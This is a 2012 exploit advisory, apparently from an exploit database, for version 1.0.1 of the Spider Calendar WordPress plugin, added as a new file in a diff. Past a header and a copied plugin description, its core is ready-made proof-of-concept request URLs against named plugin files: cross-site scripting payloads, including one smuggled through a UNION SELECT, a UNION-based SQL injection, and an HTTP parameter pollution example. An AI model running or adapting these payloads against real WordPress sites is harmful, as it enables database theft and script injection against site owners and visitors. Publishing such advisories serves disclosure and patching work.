@@ -1,0 +1,53 @@
+ Exploit Title: Wordpress spider calendar Plugin Multiple Vulnerabilities
+
+ Dork: N/A
+ 
+ Date: [02-10-2012]
+ 
+ Author: Daniel Barragan "D4NB4R"
+ 
+ Twitter: @D4NB4R
+ 
+ Vendor: http://wordpress.org/extend/plugins/spider-calendar/
+ 
+ Version: 1.0.1
+ 
+ License: Non-Commercial
+
+ Demo: http://wpdemo.web-dorado.com/spider-calendar/
+
+ Download: http://downloads.wordpress.org/plugin/spider-calendar.zip
+  
+ Tested on: [Linux(bt5)-Windows(7ultimate)]
+
+ Especial greetz:  _84kur10_, nav, dedalo, ksha, shine, p0fk, the_s41nt
+
+
+Descripcion Plugin Wordpress: 
+
+Spider Calendar is a highly configurable plugin which allows you to have multiple organized events in a calendar. This plugin is one of the best WordPress Calendar available in WordPress Directory. If you have problem with organizing your events and displaying them in a calendar format, then Spider Calendar is the best solution. Maybe you just want to have a quick look at your calendar to remind yourself about the future appointments? It will be great if calendar extension will be able to show all events, display them in a widget as a beautiful and customizable calendar on your website. Spider WordPress Calendar is an extraordinary user friendly calendar.
+
+Exploit: 
+
+
+    XSS : Cross-site scripting
+
+           http://127.0.0.1/wp-content/plugins/Calendar/front_end/spidercalendarbig.php?calendar_id=1&cur_page_url=&date=D4NB4R'"()%26%251<ScRiPt >prompt()<%2fScRiPt>&day=01&ev_ids=1&eventID=1&theme_id=5
+    
+           http://127.0.0.1/wp-content/plugins/Calendar/front_end/spidercalendarbig_seemore.php?theme_id=5&ev_ids=1&calendar_id=null union all select 1,1,1,1,0x3c7363726970743e616c657274282244344e42345220576173204865726522293c2f7363726970743e,1,1,1,1,1,1,1,1,1,1,1,1+--+&date=2012-10-10&many_sp_calendar=1&cur_page_url=http://127.0.0.1/spider-calendar/
+    
+
+    SQL : SQL injection
+
+           http://127.0.0.1//wp-content/plugins/Calendar/front_end/spidercalendarbig_seemore.php?theme_id=5&ev_ids=1&calendar_id=null union all select 1,1,1,1,version(),1,1,1,1,1,1,1,1,1,1,1,1+--+&date=2012-10-10&many_sp_calendar=1&cur_page_url=
+
+
+    HPP : HTTP Parameter Pollution (HPP)
+
+           http://127.0.0.1/wp-content/plugins/Calendar/front_end/spidercalendarbig_seemore.php?calendar_id=1&ev_ids=1&theme_id=5%26D4NB4R%3dD4NB4R >> 127.0.0.1//wp-content/plugins/Calendar/front_end/spidercalendarbig_seemore.php?calendar_id=1&ev_ids=1&theme_id=5&d4nb4r=d4nb4r
+
+  
+_____________________________________________________
+Daniel Barragan "D4NB4R" 2012
+
+           
